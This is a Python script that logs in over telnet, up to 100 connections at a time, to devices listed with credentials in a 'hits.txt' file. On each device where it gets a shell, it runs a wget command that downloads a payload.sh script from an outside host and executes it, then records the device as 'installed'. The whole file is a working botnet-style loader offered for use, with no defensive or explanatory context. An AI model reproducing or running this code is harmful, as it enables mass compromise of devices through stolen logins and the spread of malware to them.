import asyncio
import telnetlib3
from aiofiles import open as aio_open
from aiofiles.os import wrap
import sys

HITS_FILE = "hits.txt"
INSTALLED_FILE = "installed.txt"
COMMAND_TO_RUN = "wget http://example.com/payload.sh -O /tmp/a.sh; chmod +x /tmp/a.sh; /tmp/a.sh\n"
CONCURRENCY = 100

semaphore = asyncio.Semaphore(CONCURRENCY)
write_success = wrap(open(INSTALLED_FILE, 'a').write)

async def install_on_device(ip, port, user, password):
    async with semaphore:
        try:
            print(f"[~] Connecting to {ip}:{port} with {user}:{password}")
            reader, writer = await asyncio.wait_for(
                telnetlib3.open_connection(ip, port=int(port), shell=None), timeout=10
            )

            await asyncio.sleep(1)
            writer.write(user + '\n')
            await asyncio.sleep(1)
            writer.write(password + '\n')
            await asyncio.sleep(2)

            # Try to detect shell prompt
            output = await reader.read(4096)
            if any(prompt in output for prompt in ['#', '$', '>']):
                print(f"[+] Auth successful on {ip}, executing payload...")
                writer.write(COMMAND_TO_RUN)
                writer.write("exit\n")
                await write_success(f"{ip}:{port} {user}:{password}\n")
            else:
                print(f"[-] Auth failed or no shell on {ip}")
            writer.close()
        except Exception as e:
            print(f"[!] Failed {ip}:{port} -> {e}")

async def parse_hits_and_run():
    async with aio_open(HITS_FILE, "r") as f:
        lines = await f.readlines()

    tasks = []
    for line in lines:
        try:
            addr_part, cred_part = line.strip().split()
            ip, port = addr_part.split(":")
            user, password = cred_part.split(":")
            tasks.append(install_on_device(ip, port, user, password))
        except Exception as e:
            print(f"[!] Invalid line: {line.strip()} ({e})")

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    if sys.version_info < (3, 8):
        asyncio.get_event_loop().run_until_complete(parse_hits_and_run())
    else:
        asyncio.run(parse_hits_and_run())
